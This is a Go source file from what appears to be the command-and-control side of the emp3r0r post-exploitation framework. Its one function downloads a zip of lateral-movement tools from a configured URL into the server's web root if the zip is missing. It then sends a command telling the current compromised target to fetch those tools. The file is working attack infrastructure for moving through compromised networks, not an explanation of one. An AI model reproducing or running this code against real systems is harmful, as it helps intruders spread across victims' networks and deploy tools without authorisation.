package cc

import "github.com/jm33-m0/emp3r0r/core/internal/agent"

// upload a zip file that packs several lateral-movement tools
// statically linked, built under alpine
func moduleUtils() {
	if !agent.IsFileExist(WWWRoot + "utils.zip") {
		utilsURL := Options["url"].Val
		CliPrintError("[*] utils.zip not found, downloading from " + utilsURL)

		if err := agent.Download(utilsURL, WWWRoot+"utils.zip"); err != nil {
			CliPrintError("[*] utils.zip could not be downloaded: %v", err)
		}
	}

	err := SendCmd("!utils", CurrentTarget)
	if err != nil {
		CliPrintError("[-] SendCmd failed: %v", err)
	}
}
